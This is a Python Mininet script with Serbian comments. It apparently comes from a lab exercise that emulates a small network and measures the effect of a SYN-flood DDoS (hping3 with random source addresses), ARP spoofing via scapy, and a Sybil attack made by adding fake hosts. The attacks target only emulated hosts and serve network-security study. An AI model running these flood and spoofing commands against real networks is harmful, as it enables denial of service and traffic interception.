from mininet.net import Mininet
from mininet.node import Controller
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink
import time
import re
from scapy.all import send, ARP, conf


def get_cpu_usage(host):
    """
    Prikuplja CPU opterecenje na hostu koristeci top komandu.
    """
    result = host.cmd("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'").strip()
    
    # Koristimo regularni izraz za pronalazenje broja
    match = re.search(r'(\d+(\.\d+)?)\D*$', result)
    
    if match:
        cpu_usage = float(match.group(1))
    else:
        cpu_usage = -1.0  # Vrednost za gresku u slucaju da nije pronadjen broj
    
    return cpu_usage

def get_ping_latency(host1, host2):
    """
    Prikuplja prosecno kašnjenje (latency) izmedju dva hosta koristeci ping komandu.
    """
    result = host1.cmd(f"ping -c 4 {host2.IP()}")
	#Koristimo regularni izraz za pronalazenje broja
    match = re.search(r'rtt min/avg/max/mdev = \S+/\S+/(\S+)', result)
    if match:
        latency = float(match.group(1))
    else:
        latency = -1.0  # Vrednost za gresku u slucaju da nije pronadjen broj
    
    return latency

def get_known_hosts(host):
	"""
	Prikuplja listu poznatih hostova 
	"""
	result = host.cmd('arp -n').strip().split('\n')[1:]
	info(result)

	known_hosts = len(result)
	
	return known_hosts

def ping_all_hosts(net):
        """
        Salje ping sa svakog hosta na svaki susedni host kako bi popunio ARP tabelu
        """
        hosts = net.hosts
        for host in hosts:
            for target in hosts:
                if host != target:
                    host.cmd(f'ping -c 1 {target.IP()}')

def create_network():
    net = Mininet(controller=Controller, link=TCLink)

    info('*** Dodavanje kontrolera\n')
    net.addController('c0',timeout=10)
    
    info('*** Dodavanje switch-eva\n')
    s1 = net.addSwitch('s1')
    s2 = net.addSwitch('s2')
    s3 = net.addSwitch('s3')
    s4 = net.addSwitch('s4')
    s5 = net.addSwitch('s5')
    s6 = net.addSwitch('s6')

    info('*** Dodavanje cvorova\n')
    h1 = net.addHost('h1', ip='10.0.0.1')
    h2 = net.addHost('h2', ip='10.0.0.2')
    h3 = net.addHost('h3', ip='10.0.0.3')
    h4 = net.addHost('h4', ip='10.0.0.4')
    h5 = net.addHost('h5', ip='10.0.0.5')
    h6 = net.addHost('h6', ip='10.0.0.6')

    info('*** Dodavanje linkova\n')
    net.addLink(h1, s1, bw=100)
    net.addLink(h2, s2, bw=100)
    net.addLink(h3, s3, bw=100)
    net.addLink(h4, s4, bw=100)
    net.addLink(h5, s5, bw=100)
    net.addLink(h6, s6, bw=100)
    net.addLink(s1, s2, bw=100)
    net.addLink(s1, s3, bw=100)
    net.addLink(s2, s4, bw=100)
    net.addLink(s3, s5, bw=100)
    net.addLink(s4, s6, bw=100)
    net.addLink(s5, s6, bw=100)
    net.addLink(s2, s5, bw=100)
    net.addLink(s3, s4, bw=100)

    info('*** Pokretanje mreze\n')
    net.start()

    info('*** Pokretanje HTTP servera na h2\n')
    h2.cmd('python3 -m http.server 80 &')

    time.sleep(2)  # Dajemo malo vremena serveru da se pokrene
    
    def ddos_napad():
        info('*** Prikupljanje CPU opterećenja pre DDoS napada\n')
        pre_ddos_cpu = get_cpu_usage(h2)
        info(f'Pre DDoS napada - CPU: {pre_ddos_cpu}%\n')

        for host in [h1, h3, h4, h5, h6]:
            for _ in range(3):  # Pokretanje 3 instance hping3 na svakom hostu
                host.cmd('hping3 -S --flood --fast --rand-source 10.0.0.2 &')


        time.sleep(10)  # Dajemo vremena napadu da se desi

        info('*** Prikupljanje CPU opterecenja posle DDoS napada\n')
        post_ddos_cpu = get_cpu_usage(h2)
        info(f'Posle DDoS napada - CPU: {post_ddos_cpu}%\n')
    
    def routing_napad():
        info('*** Prikupljanje prosecnog kasnjenja pre napada\n')
        pre_attack_latency = get_ping_latency(s1, s2)
        info(f'Pre napada - Prosecno kasnjenje: {pre_attack_latency} ms\n')

        info('*** Izvodjenje routing table poisoning napada (ARP spoofing)\n')
        
        def arp_poison(target, gateway):
            """
            Salje lazne ARP poruke ciljnom hostu kako bi preusmerio saobracaj kroz napadaca.
            """
            send(ARP(op=2, pdst=target.IP(), psrc=gateway.IP(), hwdst=target.MAC()), count=5)

        # Pokrecemo napad sa h1 prema h2 i h3
        arp_poison(s2, s1)
        arp_poison(s3, s1)

        time.sleep(10)  # Dajemo vremena napadu da se desi

        info('*** Prikupljanje prosecnog kasnjenja posle napada\n')
        post_attack_latency = get_ping_latency(s1, s2)
        info(f'Posle napada - Prosecno kasnjenje: {post_attack_latency} ms\n')
        
        # Provera uspesnosti napada
        if post_attack_latency > pre_attack_latency:
            info('*** Routing table poisoning napad je uspesan\n')
        else:
            info('*** Routing table poisoning napad nije uspesan\n')

    def sybil_napad():
		
        sybil_hosts = []
        for i in range(7, 10):
            sybil_host = net.addHost(f'h{i}', ip=f'10.0.0.{i}')
            net.addLink(s1, sybil_host, bw=100)
            sybil_hosts.append(sybil_host)
        
        # Racuna broj poznatih hostova pre napada
        pre_attack_known_hosts = get_known_hosts(h1)
        info(f'Broj poznatih hostova pre napada: {pre_attack_known_hosts}\n')
        
        net.start()  # Restartujemo mrezu da bi primenili promene
		
		# Slanje ARP zahteva u cilju popunjavanja ARP tabele
        for sybil_host in sybil_hosts:
            h1.cmd(f'ping -c 1 {sybil_host.IP()}')

        ping_all_hosts(net)
        # Racuna broj poznatih hostova posle napada
        post_attack_known_hosts = get_known_hosts(h1)
        info(f'Post-attack known hosts on h1: {post_attack_known_hosts}\n')
        
        # Provera rezultata
        impact = post_attack_known_hosts - pre_attack_known_hosts
        info(f'Sybil napad je dodao: {impact} novih hostova\n')

		

    
    #routing_napad()        
    #ddos_napad()
    #sybil_napad()
	
    CLI(net)

    info('*** Zaustavljanje mreze\n')
    net.stop()

if __name__ == '__main__':
    setLogLevel('info')
    create_network()
